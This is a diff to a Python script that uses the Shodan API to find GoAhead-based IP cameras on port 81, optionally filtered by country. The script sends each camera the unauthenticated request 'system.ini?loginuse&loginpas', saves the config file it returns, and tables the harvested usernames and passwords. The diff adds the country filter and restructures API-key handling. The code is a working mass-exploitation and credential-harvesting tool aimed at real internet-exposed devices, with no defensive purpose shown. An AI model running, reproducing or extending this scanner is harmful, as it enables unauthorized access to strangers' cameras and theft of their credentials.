@@ -1,23 +1,59 @@
-import shodan, os, urllib.request, requests, argparse, configparser, json
+import os
+import json
+import shodan
+import argparse
+import configparser
+import urllib.request
+from geocoder import ip
 from requests import get
 from requests import session
+from prettytable import PrettyTable
 from colorama import init, Fore, Back
 from progress.bar import IncrementalBar
-from prettytable import PrettyTable
 from requests.auth import HTTPDigestAuth
-from geocoder import ip
+import requests
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--api", default=None)
 parser.add_argument("--ip", default=None)
+parser.add_argument("--country", default=None)
 args = parser.parse_args()
 
+init(autoreset=True)
+
+if os.path.exists('api_key.config') == False:
+  while True:
+    try:
+     api = input('Enter a valid API Key: ')
+     if api == '':
+      pass
+     else:
+      key = shodan.Shodan(api)
+      key.search('realm="GoAhead", domain=":81"')
+      with open('api_key.config', 'w') as e:
+       e.write('[API]')
+      conf = configparser.RawConfigParser()
+      conf.read("api_key.config", encoding='utf-8')
+      conf.set("API", "API", api)
+      conf.write(open("api_key.config", "w", encoding='utf-8'))
+      #os.system('cls || clear')
+      break
+    except KeyboardInterrupt:
+      print(Fore.LIGHTRED_EX + "\nProgram stopped.")
+      exit()
+    except:
+      print(Fore.LIGHTRED_EX + "Wrong API key! Try again.\n")
+else:
+  conf = configparser.RawConfigParser()    
+  conf.read("api_key.config", encoding='utf-8')
+
+key = conf.get("API", "api")
+
 def custom(ip):
- init(autoreset=True)
  if os.path.exists('api_key.config') == False:
   while True:
     try:
-     api = input('Enter valid API key: ')
+     api = input('Enter a valid API Key: ')
      if api == '':
       pass
      else:
@@ -52,7 +88,7 @@ def custom(ip):
   for ip in list(set(ips)):
    try:
 
-    print(f"\nTested {Fore.CYAN + ip}")
+    print(f"\nTesting {Fore.CYAN + ip}")
     r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
 
     with open(f'camera_{ip}.ini', 'wb') as f:
@@ -157,6 +193,31 @@ def custom(ip):
  exit()
 
 
+def country(country):
+ reasons = '''
+ [*] API key is not premium.
+ [*] Wrong API key.
+ [*] Wrong country code (Alpha-2 required)
+ [*] No internet connection'''
+ try:
+  test = shodan.Shodan(key)
+  test.search(f'realm="GoAhead", domain=":81", country:{country}')
+  global request
+  request = f'realm="GoAhead", domain=":81", country:{country}'
+  os.system('clear || cls')
+ except shodan.exception.APIError as e:
+  print(Fore.LIGHTRED_EX + f'\nError: {e}')
+  exit()
+ except:
+  print(f'An unexpected error has occurred! Possible reasons:\n{reasons}')
+  exit()
+
+if args.country == None:
+    request = 'realm="GoAhead", domain=":81"'
+    pass
+else:
+  country(args.country)
+
 if args.ip == None:
     pass
 else:
@@ -173,7 +234,7 @@ else:
          conf.read("api_key.config", encoding='utf-8')
          conf.set("API", "api", args.api)
          conf.write(open("api_key.config", "w", encoding='utf-8'))
-         print('Key updated successfully!\n')
+         print('Key updated successfully!')
          exit()
         except Exception as i:
          print(i)
@@ -185,7 +246,7 @@ else:
         print("Wrong API key! Try again.")
         exit()
 
-os.system('clear || cls')
+#os.system('clear || cls')
 
 try:
  mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
@@ -199,35 +260,35 @@ except:
  print("Something went wrong!")
  exit()
 
-init(autoreset=True)
+# init(autoreset=True)
 
-if os.path.exists('api_key.config') == False:
-  while True:
-    try:
-     api = input('Enter valid API key: ')
-     if api == '':
-      pass
-     else:
-      key = shodan.Shodan(api)
-      key.search('realm="GoAhead", domain=":81"')
-      with open('api_key.config', 'w') as e:
-       e.write('[API]')
-      conf = configparser.RawConfigParser()
-      conf.read("api_key.config", encoding='utf-8')
-      conf.set("API", "API", api)
-      conf.write(open("api_key.config", "w", encoding='utf-8'))
-      #os.system('cls || clear')
-      break
-    except KeyboardInterrupt:
-      print("\nProgram stopped.")
-      exit()
-    except:
-      print("Wrong API key! Try again.\n")
-else:
-  conf = configparser.RawConfigParser()    
-  conf.read("api_key.config", encoding='utf-8')
+# if os.path.exists('api_key.config') == False:
+#   while True:
+#     try:
+#      api = input('Enter valid API key: ')
+#      if api == '':
+#       pass
+#      else:
+#       key = shodan.Shodan(api)
+#       key.search('realm="GoAhead", domain=":81"')
+#       with open('api_key.config', 'w') as e:
+#        e.write('[API]')
+#       conf = configparser.RawConfigParser()
+#       conf.read("api_key.config", encoding='utf-8')
+#       conf.set("API", "API", api)
+#       conf.write(open("api_key.config", "w", encoding='utf-8'))
+#       #os.system('cls || clear')
+#       break
+#     except KeyboardInterrupt:
+#       print("\nProgram stopped.")
+#       exit()
+#     except:
+#       print("Wrong API key! Try again.\n")
+# else:
+#   conf = configparser.RawConfigParser()    
+#   conf.read("api_key.config", encoding='utf-8')
 
-key = conf.get("API", "api")
+# key = conf.get("API", "api")
 
 api = shodan.Shodan(key)
 
@@ -237,7 +298,7 @@ ips = []
 def st():
 
  try:
-  results = api.search('realm="GoAhead", domain=":81"')
+  results = api.search(request)
  except shodan.exception.APIError:
   os.remove('api_key.config')
   print('Wrong API key!\nRestart the program and enter the correct API.')
@@ -252,7 +313,7 @@ def st():
  for ip in list(set(ips)):
   try:
 
-   print(f"Tested {Fore.CYAN + ip}")
+   print(f"Testing {Fore.CYAN + ip}")
    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
 
    with open(f'camera_{ip}.ini', 'wb') as f:
@@ -278,7 +339,7 @@ if len(num_of_vulnerable) >= int('1'):
 else:
   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 
-th = ['IP', 'PORT', 'USERNAME', 'PASSWORD', 'COUNTRY']
+th = ['IP', 'PORT', 'USERNAME', 'PASSWORD', 'LAND']
 td = []
 
 if len(num_of_vulnerable) >= int('1'):
